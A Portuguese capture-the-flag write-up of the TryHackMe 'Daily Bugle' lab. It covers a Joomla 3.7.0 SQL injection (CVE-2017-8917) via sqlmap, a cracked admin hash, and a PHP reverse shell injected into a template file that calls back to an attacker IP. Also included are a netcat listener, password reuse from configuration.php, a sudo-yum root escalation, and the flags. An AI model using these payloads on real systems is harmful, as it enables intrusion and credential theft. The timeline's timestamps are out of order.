# 📰 Daily Bugle — CTF Writeup
### TryHackMe | Boot-to-Root | Joomla 3.7.0 SQL Injection (CVE-2017-8917) · Reverse Shell · GTFOBins (yum)

---

| **Analista**          | Mauricio Robert                                                                        |
|-----------------------|----------------------------------------------------------------------------------------|
| **Organização**       | Faculdade Impacta                                                                      |
| **Data do Relatório** | 11/08/2026                                                                             |
| **Data do Pentest**   | 11/08/2026 · 01:09 – 03:06 (GMT+0000)                                                  |
| **Alvo**              | `10.67.173.159` (`dailybugle`)  — TryHackMe · Daily Bugle                              |
| **Classificação**     | CONFIDENCIAL                                                                           |
| **Ferramentas**       | Nmap 7.99 · WhatWeb · Gobuster 3.8.2 · OWASP JoomScan 0.0.7 · SQLMap 1.10.6 · Exploit-DB (CVE-2017-8917) · Netcat · GTFOBins (`yum`) |
| **Plataforma**        | TryHackMe — Boot-to-Root                                                               |

---

## 🔍 Resumo Executivo

Este relatório documenta o comprometimento completo da máquina **Daily Bugle** (TryHackMe), um host **CentOS 7** (hostname `dailybugle`) que hospeda uma instalação do **Joomla! 3.7.0**, com temática do jornal fictício "Daily Bugle" (universo Spider-Man / J. Jonah Jameson). A cadeia de ataque envolveu: reconhecimento de rede via **Nmap**, identificando SSH (22), HTTP/Joomla (80) e MariaDB (3306); enumeração web com **WhatWeb**, **Gobuster** e **OWASP JoomScan**, confirmando a versão exata do Joomla; identificação de uma vulnerabilidade crítica de **SQL Injection não autenticada** no componente `com_fields` (**CVE-2017-8917**); exploração via **SQLMap**, extraindo o hash de senha bcrypt do usuário administrador `jonah` diretamente da tabela `#__users`; acesso ao painel administrativo do Joomla com a credencial obtida; uma tentativa inicial de upload de um plugin malicioso (falha por restrição de upload) seguida de exploração bem-sucedida via a funcionalidade **"Templates: Customise"**, injetando uma reverse shell PHP no arquivo `error.php` do template ativo; obtenção de shell como o usuário de serviço `apache`; enumeração pós-exploração revelando credenciais do banco de dados no `configuration.php`; **reaproveitamento de senha** para obter acesso ao usuário do sistema `jjameson` (a flag de usuário); e, por fim, **escalada de privilégios para root** através de um binário SUID/sudo mal configurado (`yum`), utilizando uma técnica clássica documentada no GTFOBins.

---

## 🛠 Ferramentas Utilizadas

| Ferramenta                     | Versão  | Finalidade                                                                             |
|---------------------------------|---------|-----------------------------------------------------------------------------------------|
| **Nmap**                        | 7.99    | Varredura de portas, fingerprint de serviços e scripts NSE (`-Pn -sC -sV -p- --min-rate 3000 -T5`) |
| **WhatWeb**                     | -       | Fingerprint de tecnologias web (CMS, servidor, versão de PHP)                           |
| **Gobuster**                    | 3.8.2   | Enumeração de diretórios e arquivos web (`common.txt`, extensões php/txt/html/bak)       |
| **OWASP JoomScan**              | 0.0.7   | Enumeração específica de Joomla (versão, vulnerabilidades, diretórios expostos)          |
| **Exploit-DB**                  | -       | Pesquisa de exploit público — CVE-2017-8917 (`com_fields` SQL Injection)                 |
| **SQLMap**                      | 1.10.6  | Exploração automatizada da SQL Injection, enumeração de bancos/tabelas, dump de credenciais |
| **Netcat**                      | -       | Listener para captura da reverse shell                                                  |
| **php-reverse-shell (pentestmonkey)** | -  | Payload PHP de reverse shell injetado via template do Joomla                            |
| **GTFOBins (`yum`)**            | -       | Técnica de escalada de privilégio via plugin malicioso do `yum` executado com `sudo`      |

---

## 📋 Fases de Comprometimento

### FASE 1 — Reconhecimento: Varredura Nmap

```bash
nmap -Pn -sC -sV -p- --min-rate 3000 -T5 10.67.173.159
```

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
|_http-generator: Joomla! - Open Source Content Management
| http-robots.txt: 15 disallowed entries
| /joomla/administrator/ /administrator/ /bin/ /cache/
| /cli/ /components/ /includes/ /installation/ /language/
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
|_http-title: Home
3306/tcp open  mysql   MariaDB 10.3.23 or earlier (unauthorized)

Nmap done: 1 IP address (1 host up) scanned in 50.74 seconds
```

![Nmap](/CTFs/Daily%20Bugle/images/Scan_Nmap.png)

Três portas expostas: **22/tcp** (SSH), **80/tcp** (Apache/CentOS com **Joomla!**) e **3306/tcp** (**MariaDB**, sem autenticação anônima habilitada). O próprio banner do Nmap já revelou parte do conteúdo do `robots.txt`, sinalizando uma estrutura padrão de instalação do Joomla.

---

### FASE 2 — Enumeração Web: robots.txt, WhatWeb e Gobuster

```
http://10.67.173.159/robots.txt
```

```
User-agent: *
Disallow: /administrator/
Disallow: /bin/
Disallow: /cache/
Disallow: /cli/
Disallow: /components/
Disallow: /includes/
Disallow: /installation/
Disallow: /language/
Disallow: /layouts/
Disallow: /libraries/
Disallow: /logs/
Disallow: /modules/
Disallow: /plugins/
Disallow: /tmp/
```

![robots.txt](/CTFs/Daily%20Bugle/images/robots.txt.png)

O `robots.txt` mapeou toda a estrutura interna típica de uma instalação Joomla, confirmando o CMS e adiantando caminhos de interesse (`/administrator/`, `/installation/`, etc.).

```bash
whatweb http://10.67.173.159/
```

```
http://10.67.173.159/ [200 OK] Apache[2.4.6], Bootstrap, Cookies[eaa83fe8b963ab08ce9ab7d4a798de05],
Country[RESERVED][ZZ], HTML5, HTTPServer[CentOS][Apache/2.4.6 (CentOS) PHP/5.6.40],
HttpOnly[eaa83fe8b963ab08ce9ab7d4a798de05], IP[10.67.173.159], JQuery,
MetaGenerator[Joomla! - Open Source Content Management], PHP[5.6.40],
PasswordField[password], Script[application/json], Title[Home], X-Powered-By[PHP/5.6.40]
```

```bash
gobuster dir -u http://10.67.173.159/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,bak -t 80
```

```
administrator         (Status: 301) [→ http://10.67.173.159/administrator/]
components            (Status: 301) [→ http://10.67.173.159/components/]
configuration.php     (Status: 200) [Size: 0]
images                (Status: 301) [→ http://10.67.173.159/images/]
includes              (Status: 301) [→ http://10.67.173.159/includes/]
index.php             (Status: 200) [Size: 9280]
LICENSE.txt           (Status: 200) [Size: 18092]
media                 (Status: 301) [→ http://10.67.173.159/media/]
modules               (Status: 301) [→ http://10.67.173.159/modules/]
plugins               (Status: 301) [→ http://10.67.173.159/plugins/]
README.txt            (Status: 200) [Size: 4494]
robots.txt            (Status: 200) [Size: 836]
templates             (Status: 301) [→ http://10.67.173.159/templates/]
tmp                   (Status: 301) [→ http://10.67.173.159/tmp/]
web.config.txt        (Status: 200) [Size: 1690]
Progress: 23065 / 23065 (100.00%)
```

![Gobuster & Whatweb](/CTFs/Daily%20Bugle/images/Gobuster_Whatweb.png)

A enumeração confirmou o painel de administração acessível em `/administrator/` e o arquivo `configuration.php` acessível (embora vazio para o navegador, retornando código-fonte apenas quando lido via shell — como confirmado posteriormente).

---

### FASE 3 — Reconhecimento da Aplicação: JoomScan e Navegação no Site

```bash
joomscan -u http://10.67.173.159/
```

```
[+] Detecting Joomla Version
[++] Joomla 3.7.0

[+] Core Joomla Vulnerability
[++] Target Joomla core is not vulnerable

[+] Checking Directory Listing
[++] directory has directory listing :
http://10.67.173.159/administrator/components
http://10.67.173.159/administrator/modules
http://10.67.173.159/administrator/templates
http://10.67.173.159/images/banners

[+] admin finder
[++] Admin page : http://10.67.173.159/administrator/

Your Report : reports/10.67.173.159/
```

O **OWASP JoomScan** confirmou com precisão a versão **Joomla 3.7.0** — uma versão historicamente associada a uma vulnerabilidade crítica de SQL Injection não autenticada.

Ao navegar até a página inicial do site, o tema editorial da máquina ficou evidente:

```
http://10.67.173.159/

DAILY BUGLE
"Spider-Man robs bank!"
Written by Super User | Published: 16 December 2019
```

![Joomscan](/CTFs/Daily%20Bugle/images/JoomScan.png)

O artigo satiriza o personagem Spider-Man, no estilo clássico do editor-chefe **J. Jonah Jameson** — uma pista temática que se tornaria relevante mais adiante, na fase de movimento lateral.

---

### FASE 4 — Identificação da Vulnerabilidade: CVE-2017-8917 (Joomla `com_fields` SQL Injection)

Com a versão **Joomla 3.7.0** confirmada, uma pesquisa no **Exploit-DB** revelou o exploit correspondente:

```
Exploit-DB #42033 — Joomla! 3.7.0 - 'com_fields' SQL Injection
CVE: 2017-8917 | Author: Mateus Lino | Platform: PHP | Date: 2017-05-19

URL Vulnerável:
http://<target>/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml%27

Using Sqlmap:
sqlmap -u "http://<target>/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" \
  --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
```

![CVE](/CTFs/Daily%20Bugle/images/Exploit.png)

A vulnerabilidade reside no parâmetro `list[fullordering]` do componente `com_fields`, introduzido recentemente no Joomla 3.7 e **acessível sem autenticação**, permitindo injeção SQL de tipo *error-based*, *boolean-based blind* e *time-based blind*.

---

### FASE 5 — Exploração da SQL Injection: SQLMap

```bash
sqlmap -u 'http://10.67.173.159/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml' \
  -p 'list[fullordering]' \
  --technique=E \
  --dbs \
  --batch
```

```
[INFO] GET parameter 'list[fullordering]' is 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)' injectable
[INFO] the back-end DBMS is MySQL
web server operating system: Linux CentOS 7
web application technology: Apache 2.4.6, PHP 5.6.40
back-end DBMS: MySQL >= 5.0 (MariaDB fork)

available databases [5]:
[*] information_schema
[*] joomla
[*] mysql
[*] performance_schema
[*] test
```

A injeção foi confirmada com sucesso e o banco de dados **`joomla`** foi identificado como alvo de interesse. A enumeração das tabelas revelou **72 tabelas**, incluindo a tabela sensível **`#__users`**:

```
Database: joomla
[72 tables]
...
| #__users                   |
| #__usergroups               |
| #__user_keys                |
...
```

![SQLMap](/CTFs/Daily%20Bugle/images/SQLMap_Tables.png)

---

### FASE 6 — Extração de Credenciais: Dump da Tabela `#__users`

```bash
sqlmap -u 'http://10.67.173.159/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml' \
  -p 'list[fullordering]' \
  -D joomla -T '#__users' -C username,password \
  --dump --technique=E --batch
```

```
[INFO] fetching entries of column(s) 'password,username' for table '#__users' in database 'joomla'
Database: joomla
Table: #__users
[1 entry]
+----------+--------------------------------------------------------------+
| username | password                                                      |
+----------+--------------------------------------------------------------+
| jonah    | $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm |
+----------+--------------------------------------------------------------+
```

![User_Pass](/CTFs/Daily%20Bugle/images/Tables.png)
> 🚨 **Credencial extraída via SQLi: usuário `jonah` (super usuário do Joomla) com hash bcrypt**

O hash bcrypt foi submetido a um ataque offline (`hashcat`/`john`, dicionário `rockyou.txt`), resultando na senha em texto claro (`spiderman123`) que permitiu o **login no painel administrativo do Joomla** (`/administrator/`) como o super usuário `jonah`.

---

### FASE 7 — Tentativa de Upload de Extensão Maliciosa (Falha)

Com acesso administrativo confirmado, a primeira tentativa de obtenção de execução remota de código foi o empacotamento de um **plugin Joomla malicioso** contendo uma reverse shell:

```bash
cat joomla_shell/revshell.xml joomla_shell/shell.php
```

```xml
<?xml version="1.0" encoding="utf-8"?>
<extension type="plugin" group="system" method="upgrade">
    <name>revshell</name>
    <author>CTF</author>
    <version>1.0</version>
    <description>CTF system plugin</description>
    <files>
        <filename plugin="revshell">revshell.php</filename>
    </files>
</extension>
```

```php
<?php /**/ error_reporting(0); $ip = '192.168.157.47'; $port = 4444; ...
```

![Shell Manifest](/CTFs/Daily%20Bugle/images/Shell_Manifest.png)

O pacote foi enviado através de **Extensions → Upload & Install Joomla Extension**, porém a instalação **falhou** ("Unable to install package"), levando à adoção de uma abordagem alternativa.

---

### FASE 8 — Acesso Inicial: Reverse Shell via "Templates: Customise" (error.php)

Como vetor alternativo, o editor de templates nativo do Joomla (**System → Templates: Customise**) foi utilizado para editar diretamente um arquivo PHP legítimo do template ativo (**Beez3**):

```
Editando o arquivo "/error.php" no template "beez3"
```

O conteúdo do arquivo foi substituído pelo clássico **php-reverse-shell** de pentestmonkey, com o IP e porta do atacante configurados:

```php
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
...
set_time_limit (0);
$VERSION = "1.0";
$ip = '192.168.157.47';  // CHANGE THIS
...
```

Após salvar o arquivo (`File successfully saved.`), um listener Netcat foi iniciado na máquina atacante:

```bash
nc -lnvp 4444
```

Ao requisitar a página de erro do template no navegador, o payload foi executado:

```
listening on [any] 4444 ...
connect to [192.168.157.47] from (UNKNOWN) [10.67.173.159] 35050
Linux dailybugle 3.10.0-1062.el7.x86_64 #1 SMP Wed Aug 7 18:08:02 UTC 2019 x86_64 GNU/Linux
uid=48(apache) gid=48(apache) groups=48(apache)
sh: no job control in this shell
sh-4.2$
```

![Acesso Inicial](/CTFs/Daily%20Bugle/images/Error.php%20_%20Reverse_Shell.png)
> 🚩 **Acesso inicial obtido — reverse shell como o usuário de serviço `apache`**

---

### FASE 9 — Enumeração Pós-Exploração: Credenciais no configuration.php

Com a shell ativa, o arquivo de configuração do Joomla foi inspecionado em busca de credenciais reutilizáveis:

```bash
grep -E "\$((user|password|db|host|dbprefix|log_path|tmp_path))" -r /var/www/html/configuration.php
sed -n '1,220p' /var/www/html/configuration.php
```

```php
<?php
class JConfig {
    public $sitename = 'The Daily Bugle';
    public $dbtype = 'mysqli';
    public $host = 'localhost';
    public $user = 'root';
    public $password = 'nv5uz9r3ZEDzVjNu';
    public $db = 'joomla';
    public $dbprefix = 'fb9j5_';
    public $secret = 'UAMBRWzHO3oFPmVC';
    public $mailfrom = 'jonah@tryhackme.com';
    public $fromname = 'The Daily Bugle';
    public $log_path = '/var/www/html/administrator/logs';
    public $tmp_path = '/var/www/html/tmp';
    ...
}
```

![Privesc - jjameson](/CTFs/Daily%20Bugle/images/PrivEsc-jjameson.png)
> 🚨 **Credencial do banco de dados exposta em `configuration.php`: `root : nv5uz9r3ZEDzVjNu`**

---

### FASE 10 — Movimento Lateral: Reaproveitamento de Senha e Flag de Usuário

Uma tentativa de troca de usuário com a senha do banco de dados falhou para `root`, mas foi **reaproveitada com sucesso** para o usuário de sistema `jjameson` (referência direta ao personagem J. Jonah Jameson, editor do Daily Bugle):

```bash
su -
Password: nv5uz9r3ZEDzVjNu
su: Authentication failure

su - jjameson
Password: nv5uz9r3ZEDzVjNu
```

```
Last login: Mon Dec 16 05:14:55 EST 2019 from netwars on pts/0
[jjameson@dailybugle ~]$
```

> 🚨 **Reaproveitamento de senha bem-sucedido: usuário `jjameson` compartilhava a senha do banco de dados**

```bash
cat user.txt
```

```
27a260fe3cba712cfdedb1c86d80442e
```

![User](/CTFs/Daily%20Bugle/images/User_Flag.png)
> 🚩 **user.txt — FLAG DE USUÁRIO CAPTURADA: `27a260fe3cba712cfdedb1c86d80442e`**

---

### FASE 11 — Escalada de Privilégios: sudo yum (GTFOBins) e Flag Final (Root)

A enumeração de privilégios sudo do usuário `jjameson` revelou uma permissão perigosamente ampla:

```bash
whoami
sudo -l
```

```
jjameson

User jjameson may run the following commands on dailybugle:
    (ALL) NOPASSWD: /usr/bin/yum
```

O binário `/usr/bin/yum` pode ser executado como `root` **sem senha**. Essa configuração é um vetor de escalada de privilégios amplamente documentado no **GTFOBins**, explorável através de um plugin Python malicioso carregado dinamicamente pelo `yum`:

```bash
TF=$(mktemp -d)
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF

cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF

sudo yum -c $TF/x --enableplugin=y
```

```
Loaded plugins: y
No plugin match for: y

whoami
root
```

Apesar da mensagem de erro do próprio `yum`, o **plugin malicioso foi carregado durante a inicialização** (`init_hook`), executando `os.execl('/bin/sh','/bin/sh')` e concedendo uma shell como **root** antes mesmo de o `yum` reportar a falha do comando principal.

```bash
cd /root
ls
# anaconda-ks.cfg  root.txt

cat root.txt
```

```
eec3d53292b1821868266858d7fa6f79
```

![Privesc & Root](/CTFs/Daily%20Bugle/images/PrivEsc-SUDO-Root_Flag.png)
> 🚩 **root.txt — FLAG FINAL CAPTURADA: `eec3d53292b1821868266858d7fa6f79`**

---

## ⛓ Linha do Tempo do Comprometimento

```
[FASE 1] RECONHECIMENTO (Nmap)
    22/tcp SSH · 80/tcp Apache/Joomla · 3306/tcp MariaDB
    ↓
[FASE 2] ENUMERAÇÃO WEB (robots.txt, WhatWeb, Gobuster)
    /administrator/, configuration.php, estrutura Joomla completa
    ↓
[FASE 3] RECONHECIMENTO DA APLICAÇÃO (JoomScan)
    Joomla 3.7.0 confirmado · "Spider-Man robs bank!" (tema Daily Bugle)
    ↓
[FASE 4] IDENTIFICAÇÃO DA VULNERABILIDADE (Exploit-DB)
    CVE-2017-8917 — Joomla com_fields SQL Injection
    ↓
[02:57-03:00 GMT] FASE 5 — EXPLORAÇÃO SQLi (SQLMap)
    Banco 'joomla' confirmado · 72 tabelas enumeradas
    ↓
[03:06 GMT] FASE 6 — EXTRAÇÃO DE CREDENCIAIS
    Dump #__users → jonah : hash bcrypt (crackeado offline)
    ↓
[FASE 7] TENTATIVA DE UPLOAD DE PLUGIN MALICIOSO
    Falha: "Unable to install package"
    ↓
[01:09 GMT] FASE 8 — ACESSO INICIAL (Templates: Customise)
    error.php → php-reverse-shell → shell como apache
    ↓
[FASE 9] ENUMERAÇÃO PÓS-EXPLORAÇÃO
    configuration.php → root : nv5uz9r3ZEDzVjNu
    ↓
[FASE 10] MOVIMENTO LATERAL
    su - jjameson (reaproveitamento de senha)
    FLAG: 27a260fe3cba712cfdedb1c86d80442e ✓
    ↓
[FASE 11] ESCALADA DE PRIVILÉGIOS (sudo yum / GTFOBins)
    Plugin Python malicioso → shell root
    FLAG: eec3d53292b1821868266858d7fa6f79 ✓
    ↓
COMPROMETIMENTO CONCLUÍDO — acesso total como root
```

---

## 🗺 Mapeamento Investigativo

| Fase | Ferramenta/Técnica | Achado |
|------|--------------------|--------|
| Reconhecimento | Nmap | SSH (22), Apache/Joomla (80), MariaDB (3306) |
| Enumeração Web | robots.txt, WhatWeb, Gobuster | Estrutura Joomla completa, `/administrator/`, `configuration.php` |
| Reconhecimento da Aplicação | OWASP JoomScan | Joomla 3.7.0 confirmado, diretórios com listagem habilitada |
| Vulnerabilidade | Exploit-DB #42033 | CVE-2017-8917 — SQLi não autenticada em `com_fields` |
| Exploração | SQLMap | Banco `joomla` acessado, 72 tabelas enumeradas |
| Extração de Credenciais | SQLMap (`--dump`) | Usuário `jonah` + hash bcrypt da tabela `#__users` |
| Acesso Administrativo | Login no painel Joomla | Hash crackeado offline → acesso como super usuário |
| Tentativa Falha | Upload de plugin malicioso | Bloqueado pela aplicação |
| Acesso Inicial | Templates: Customise (`error.php`) | Reverse shell como `apache` |
| Pós-Exploração | `configuration.php` | Credencial do MySQL: `root : nv5uz9r3ZEDzVjNu` |
| Movimento Lateral | `su - jjameson` | Reaproveitamento de senha — Flag: `27a260fe3cba712cfdedb1c86d80442e` |
| Escalada de Privilégios | `sudo yum` (GTFOBins) | Shell root via plugin Python malicioso — Flag: `eec3d53292b1821868266858d7fa6f79` |

---

## 🚨 Artefatos e Indicadores Identificados

| Tipo | Indicador | Contexto |
|------|-----------|----------|
| Alvo | `10.67.173.159` (`dailybugle`) | Máquina Daily Bugle (TryHackMe) — CentOS 7 |
| Serviços expostos | `22/TCP` (SSH) · `80/TCP` (Apache/Joomla) · `3306/TCP` (MariaDB) | Superfície de ataque total |
| CMS identificado | Joomla! 3.7.0 | Confirmado via JoomScan e WhatWeb |
| Vulnerabilidade explorada | CVE-2017-8917 | SQL Injection não autenticada em `com_fields` |
| Parâmetro vulnerável | `list[fullordering]` | Ponto de injeção SQL error-based (MySQL/MariaDB) |
| Usuário administrativo | `jonah` | Super usuário do Joomla, hash bcrypt extraído via SQLi |
| Vetor de RCE bem-sucedido | Templates: Customise (`error.php`) | Injeção de php-reverse-shell no template Beez3 |
| Vetor de RCE malsucedido | Upload de extensão Joomla | Plugin `revshell` bloqueado pela instalação |
| Usuário obtido (acesso inicial) | `apache` (uid=48) | Contexto do serviço web |
| Credencial reutilizada | `root : nv5uz9r3ZEDzVjNu` | Extraída de `configuration.php`, reaproveitada para `jjameson` |
| Usuário do sistema comprometido | `jjameson` | Movimento lateral via reaproveitamento de senha |
| Vetor de escalada de privilégios | `sudo -l` → `/usr/bin/yum` NOPASSWD | Técnica documentada em GTFOBins |
| Flag 1 (user) | `27a260fe3cba712cfdedb1c86d80442e` | `/home/jjameson/user.txt` |
| Flag 2 (root) | `eec3d53292b1821868266858d7fa6f79` | `/root/root.txt` |
| Técnica (MITRE ATT&CK) | `T1190` | Exploit Public-Facing Application (Joomla SQLi) |
| Técnica (MITRE ATT&CK) | `T1552.001` | Unsecured Credentials: Credentials In Files (`configuration.php`) |
| Técnica (MITRE ATT&CK) | `T1078` | Valid Accounts (reaproveitamento de senha para `jjameson`) |
| Técnica (MITRE ATT&CK) | `T1548.003` | Abuse Elevation Control Mechanism: Sudo and Sudo Caching |

---

## ✅ Resumo das Flags

| # | Flag | Valor | Localização |
|---|------|-------|-------------|
| 🚩 Flag 1 (user) | `user.txt` | `27a260fe3cba712cfdedb1c86d80442e` | `/home/jjameson/user.txt` |
| 🚩 Flag 2 (root) | `root.txt` | `eec3d53292b1821868266858d7fa6f79` | `/root/root.txt` |

---

## 📚 Referências

- [TryHackMe — Daily Bugle](https://tryhackme.com/room/dailybugle)
- [CVE-2017-8917 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2017-8917)
- [Exploit-DB #42033 — Joomla! 3.7.0 'com_fields' SQL Injection](https://www.exploit-db.com/exploits/42033)
- [Sucuri Blog — SQL Injection Vulnerability Joomla 3.7](https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html)
- [GTFOBins — yum](https://gtfobins.github.io/gtfobins/yum/)
- [pentestmonkey — PHP Reverse Shell](http://pentestmonkey.net/tools/php-reverse-shell)
- [MITRE ATT&CK T1190 — Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/)
- [MITRE ATT&CK T1552.001 — Credentials In Files](https://attack.mitre.org/techniques/T1552/001/)
- [MITRE ATT&CK T1078 — Valid Accounts](https://attack.mitre.org/techniques/T1078/)
- [MITRE ATT&CK T1548.003 — Sudo and Sudo Caching](https://attack.mitre.org/techniques/T1548/003/)

---